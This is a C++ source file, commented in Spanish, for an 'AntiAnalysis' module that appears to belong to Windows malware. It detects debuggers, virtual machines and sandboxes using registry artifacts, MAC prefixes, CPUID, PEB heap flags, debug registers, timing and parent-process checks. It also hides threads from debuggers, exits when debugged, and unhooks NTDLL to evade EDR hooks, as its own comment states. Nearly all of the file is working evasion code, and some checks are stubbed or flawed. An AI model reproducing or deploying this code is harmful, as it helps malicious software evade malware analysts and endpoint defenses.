#include "evasion/anti_analysis.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cstdint>
#include <iphlpapi.h>
#include <psapi.h>
#include <intrin.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

AntiAnalysis::AntiAnalysis() : enabled(true) {
}

AntiAnalysis::~AntiAnalysis() {
}

void AntiAnalysis::EnableAllChecks() {
    enabled = true;
    AntiHooking();
}

void AntiAnalysis::DisableAllChecks() {
    enabled = false;
}

bool AntiAnalysis::IsAnalysisEnvironment() {
    if (!enabled) return false;
    
    return IsDebugged() || IsVirtualMachine() || IsSandbox();
}

bool AntiAnalysis::IsVirtualMachine() {
    if (!enabled) return false;
    
    return CheckVMWare() || CheckVirtualBox() || CheckHyperV() || 
           CheckQEMU() || CheckWine() || CheckSandboxie() ||
           CheckDiskSize() || CheckCPUCores() || CheckMACAddress() ||
           CheckRegistryArtifacts() || CheckVMProcesses();
}

bool AntiAnalysis::IsSandbox() {
    if (!enabled) return false;
    
    return CheckUserActivity() || CheckMouseMovement() || CheckSystemUptime() ||
           CheckSleepTiming() || CheckHardwareFingerprint();
}

bool AntiAnalysis::IsDebugged() {
    if (!enabled) return false;
    
    return IsDebuggerPresentClassic() || CheckRemoteDebugger() ||
           CheckNtGlobalFlag() || CheckHeapFlags() ||
           CheckDebugBreakpoints() || CheckTimingAttack() ||
           CheckParentProcess();
}

bool AntiAnalysis::IsDebuggerPresentClassic() {
    return ::IsDebuggerPresent() != FALSE;
}

bool AntiAnalysis::CheckRemoteDebugger() {
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    return isDebuggerPresent != FALSE;
}

bool AntiAnalysis::CheckNtGlobalFlag() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    // En MinGW, acceder a NtGlobalFlag de manera diferente o omitir esta verificación
    return false; // Deshabilitado por compatibilidad con MinGW
}

bool AntiAnalysis::CheckHeapFlags() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PVOID heapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x30));
    
    DWORD heapFlags = *(PDWORD)((PBYTE)heapBase + 0x70);
    DWORD forceFlags = *(PDWORD)((PBYTE)heapBase + 0x74);
    
    return (heapFlags & ~HEAP_GROWABLE) != 0 || forceFlags != 0;
}

bool AntiAnalysis::CheckDebugBreakpoints() {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        return ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0;
    }
    
    return false;
}

bool AntiAnalysis::CheckTimingAttack() {
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    Sleep(1);
    
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    
    return elapsed > 0.1; // Si el sleep tomó demasiado tiempo, estamos en un debugger
}

bool AntiAnalysis::CheckParentProcess() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    DWORD currentPID = GetCurrentProcessId();
    DWORD parentPID = 0;
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (pe.th32ProcessID == currentPID) {
                parentPID = pe.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    
    if (parentPID != 0) {
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            if (Process32First(hSnapshot, &pe)) {
                do {
                    if (pe.th32ProcessID == parentPID) {
                        std::string parentName = pe.szExeFile;
                        CloseHandle(hSnapshot);
                        
                        // Verificar si el proceso padre es una herramienta de análisis
                        return (parentName.find("explorer.exe") == std::string::npos) &&
                               (parentName.find("winlogon.exe") == std::string::npos) &&
                               (parentName.find("csrss.exe") == std::string::npos);
                    }
                } while (Process32Next(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }
    }
    
    return false;
}

bool AntiAnalysis::CheckVMWare() {
    // Verificar claves de registro de VMware
    std::string vmwareKey = GetRegistryValue(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath");
    if (!vmwareKey.empty()) return true;
    
    // Verificar prefijo de dirección MAC de VMware
    PIP_ADAPTER_INFO adapterInfo;
    PIP_ADAPTER_INFO adapter = NULL;
    DWORD dwRetVal = 0;
    ULONG ulOutBufLen = 0;
    
    if (GetAdaptersInfo(NULL, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        adapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        
        if ((dwRetVal = GetAdaptersInfo(adapterInfo, &ulOutBufLen)) == NO_ERROR) {
            adapter = adapterInfo;
            
            while (adapter) {
                std::string macAddr = std::string(reinterpret_cast<char*>(adapter->Address), adapter->AddressLength);
                if (macAddr.length() >= 3) {
                    // Direcciones MAC de VMware comienzan con 00:0C:29, 00:50:56, o 00:05:69
                    if ((macAddr[0] == 0x00 && macAddr[1] == 0x0C && macAddr[2] == 0x29) ||
                        (macAddr[0] == 0x00 && macAddr[1] == 0x50 && macAddr[2] == 0x56) ||
                        (macAddr[0] == 0x00 && macAddr[1] == 0x05 && macAddr[2] == 0x69)) {
                        free(adapterInfo);
                        return true;
                    }
                }
                adapter = adapter->Next;
            }
        }
        
        if (adapterInfo) free(adapterInfo);
    }
    
    return false;
}

bool AntiAnalysis::CheckVirtualBox() {
    // Verificar claves de registro de VirtualBox
    std::string vboxKey = GetRegistryValue(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\ACPI\\DSDT\\VBOX__", "VBOX__");
    if (!vboxKey.empty()) return true;
    
    // Verificar prefijo de dirección MAC de VirtualBox
    PIP_ADAPTER_INFO adapterInfo;
    PIP_ADAPTER_INFO adapter = NULL;
    DWORD dwRetVal = 0;
    ULONG ulOutBufLen = 0;
    
    if (GetAdaptersInfo(NULL, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        adapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        
        if ((dwRetVal = GetAdaptersInfo(adapterInfo, &ulOutBufLen)) == NO_ERROR) {
            adapter = adapterInfo;
            
            while (adapter) {
                std::string macAddr = std::string(reinterpret_cast<char*>(adapter->Address), adapter->AddressLength);
                if (macAddr.length() >= 3) {
                    // Direcciones MAC de VirtualBox comienzan con 08:00:27
                    if (macAddr[0] == 0x08 && macAddr[1] == 0x00 && macAddr[2] == 0x27) {
                        free(adapterInfo);
                        return true;
                    }
                }
                adapter = adapter->Next;
            }
        }
        
        if (adapterInfo) free(adapterInfo);
    }
    
    return false;
}

bool AntiAnalysis::CheckHyperV() {
    // Verificar Hyper-V via CPUID
    int cpuInfo[4];
    __cpuidex(cpuInfo, 1, 0);
    
    // Verificar bit de hypervisor
    return (cpuInfo[2] >> 31) & 1;
}

bool AntiAnalysis::CheckQEMU() {
    // Verificar claves de registro de QEMU
    std::string qemuKey = GetRegistryValue(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\DESCRIPTION\\System", "SystemBiosVersion");
    if (!qemuKey.empty() && qemuKey.find("QEMU") != std::string::npos) {
        return true;
    }
    
    return false;
}

bool AntiAnalysis::CheckWine() {
    // Verificar si se está ejecutando bajo Wine
    HMODULE hntdll = GetModuleHandleA("ntdll.dll");
    if (hntdll) {
        typedef const char* (WINAPI *pwine_get_version)();
        pwine_get_version wine_get_version = (pwine_get_version)GetProcAddress(hntdll, "wine_get_version");
        if (wine_get_version) {
            return true;
        }
    }
    
    return false;
}

bool AntiAnalysis::CheckSandboxie() {
    // Verificar DLL de Sandboxie
    HMODULE hsbie = GetModuleHandleA("SbieDll.dll");
    if (hsbie) return true;
    
    // Verificar claves de registro de Sandboxie
    std::string sbieKey = GetRegistryValue(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Sandboxie", "InstallDir");
    if (!sbieKey.empty()) return true;
    
    return false;
}

bool AntiAnalysis::CheckDiskSize() {
    ULARGE_INTEGER totalBytes, freeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, NULL)) {
        DWORD totalGB = (DWORD)(totalBytes.QuadPart / (1024 * 1024 * 1024));
        return totalGB < MIN_DISK_SIZE_GB;
    }
    
    return false;
}

bool AntiAnalysis::CheckCPUCores() {
    SYSTEM_INFO sysInfo;
    ::GetSystemInfo(&sysInfo);
    return sysInfo.dwNumberOfProcessors < MIN_CPU_CORES;
}

bool AntiAnalysis::CheckMACAddress() {
    // Verificar prefijos de MAC conocidos de virtualización
    return CheckVMWare() || CheckVirtualBox();
}

bool AntiAnalysis::CheckRegistryArtifacts() {
    // Verificar varias claves de registro relacionadas con VM
    std::vector<std::pair<std::string, std::string>> vmKeys = {
        {"HARDWARE\\ACPI\\DSDT\\VBOX__", "VBOX__"},
        {"HARDWARE\\ACPI\\FADT\\VBOX__", "VBOX__"},
        {"HARDWARE\\ACPI\\RSDT\\VBOX__", "VBOX__"},
        {"SOFTWARE\\Oracle\\VirtualBox", "Version"},
        {"SYSTEM\\CurrentControlSet\\Services\\VBoxService", "Start"},
        {"SYSTEM\\CurrentControlSet\\Services\\VBoxDriver", "Start"}
    };
    
    for (const auto& key : vmKeys) {
        if (!GetRegistryValue(HKEY_LOCAL_MACHINE, key.first, key.second).empty()) {
            return true;
        }
    }

    return false;
}

bool AntiAnalysis::CheckHardwareFingerprint() {
    // Verificar huella digital de hardware consistente
    std::string fingerprint = GetHardwareFingerprint();
    
    // Fingerprint muy simple - en implementación real sería más complejo
    return fingerprint.length() < 20; // Si el fingerprint es muy simple, probablemente es VM
}

std::string AntiAnalysis::GetRegistryValue(HKEY root, const std::string& path, const std::string& value) {
    HKEY hKey;
    if (RegOpenKeyExA(root, path.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return "";
    }
    
    DWORD dataType;
    DWORD dataSize = 0;
    
    if (RegQueryValueExA(hKey, value.c_str(), NULL, &dataType, NULL, &dataSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return "";
    }
    
    if (dataType == REG_SZ || dataType == REG_EXPAND_SZ) {
        std::string result(dataSize, '\0');
        if (RegQueryValueExA(hKey, value.c_str(), NULL, &dataType, 
                            (LPBYTE)result.data(), &dataSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return result.c_str(); // Remove null terminator
        }
    }
    
    RegCloseKey(hKey);
    return "";
}

bool AntiAnalysis::ProcessExists(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return false;
}

uint64_t AntiAnalysis::GetSystemUptime() {
    return GetTickCount64() / 1000; // Convertir a segundos
}

std::string AntiAnalysis::GetHardwareFingerprint() {
    std::ostringstream oss;
    
    // Obtener info de CPU
    SYSTEM_INFO sysInfo;
    ::GetSystemInfo(&sysInfo);
    oss << "CPU:" << sysInfo.dwNumberOfProcessors << ":";
    
    // Obtener info de memoria
    MEMORYSTATUSEX memStatus = { sizeof(MEMORYSTATUSEX) };
    if (GlobalMemoryStatusEx(&memStatus)) {
        oss << "RAM:" << (memStatus.ullTotalPhys / (1024 * 1024 * 1024)) << "GB:";
    }
    
    // Obtener tamaño de disco
    ULARGE_INTEGER totalBytes;
    if (GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL)) {
        oss << "DISK:" << (totalBytes.QuadPart / (1024 * 1024 * 1024)) << "GB";
    }
    
    return oss.str();
}

void AntiAnalysis::HideFromDebugger() {
    // Ocultar thread del debugger
    typedef NTSTATUS(NTAPI *pNtSetInformationThread)(HANDLE, UINT, PVOID, ULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    if (hNtdll) {
        pNtSetInformationThread NtSetInformationThread = 
            (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");
        
        if (NtSetInformationThread) {
            NtSetInformationThread(GetCurrentThread(), 0x11, NULL, 0);
        }
    }
}

void AntiAnalysis::SleepObfuscation(DWORD milliseconds) {
    if (!enabled) {
        Sleep(milliseconds);
        return;
    }
    
    // Sleep ofuscado para evadir análisis
    DWORD start = GetTickCount();
    DWORD elapsed = 0;
    
    while (elapsed < milliseconds) {
        // Usar operaciones intensivas de CPU en lugar de Sleep
        volatile int dummy = 0;
        for (int i = 0; i < 1000; i++) {
            dummy += i;
        }
        
        // Verificar debugger periódicamente
        if (IsDebugged()) {
            ExitProcess(0);
        }
        
        elapsed = GetTickCount() - start;
    }
}

void AntiAnalysis::AntiHooking() {
    // Desenganchar NTDLL para evadir hooks de EDR
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    
    MODULEINFO mi;
    if (!GetModuleInformation(GetCurrentProcess(), hNtdll, &mi, sizeof(mi))) {
        return;
    }
    
    // Obtener NTDLL limpio del disco
    char systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    strcat_s(systemPath, "\\ntdll.dll");
    
    HANDLE hFile = CreateFileA(systemPath, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return;
    }
    
    LPVOID cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }
    
    // Encontrar y copiar sección .text
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)cleanNtdll + dosHeader->e_lfanew);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((LPBYTE)ntHeaders + 
            sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        if (strcmp((char*)section->Name, ".text") == 0) {
            DWORD oldProtect;
            VirtualProtect((LPVOID)((LPBYTE)mi.lpBaseOfDll + section->VirtualAddress),
                section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            
            memcpy((LPVOID)((LPBYTE)mi.lpBaseOfDll + section->VirtualAddress),
                (LPVOID)((LPBYTE)cleanNtdll + section->VirtualAddress),
                section->Misc.VirtualSize);
            
            VirtualProtect((LPVOID)((LPBYTE)mi.lpBaseOfDll + section->VirtualAddress),
                section->Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }
    
    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

bool AntiAnalysis::PerformAllChecks() {
    return IsAnalysisEnvironment();
}
